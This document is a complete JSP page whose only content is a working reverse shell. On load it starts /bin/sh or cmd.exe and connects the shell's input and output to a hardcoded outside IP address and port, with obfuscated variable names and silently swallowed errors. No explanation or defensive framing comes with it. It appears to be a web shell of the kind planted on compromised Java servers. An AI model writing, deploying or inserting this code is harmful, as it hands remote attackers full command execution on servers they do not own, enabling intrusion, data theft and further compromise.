<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream kT;
    OutputStream e9;

    StreamConnector( InputStream kT, OutputStream e9 )
    {
      this.kT = kT;
      this.e9 = e9;
    }

    public void run()
    {
      BufferedReader f4  = null;
      BufferedWriter zay = null;
      try
      {
        f4  = new BufferedReader( new InputStreamReader( this.kT ) );
        zay = new BufferedWriter( new OutputStreamWriter( this.e9 ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = f4.read( buffer, 0, buffer.length ) ) > 0 )
        {
          zay.write( buffer, 0, length );
          zay.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( f4 != null )
          f4.close();
        if( zay != null )
          zay.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "193.161.193.99", 46836 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
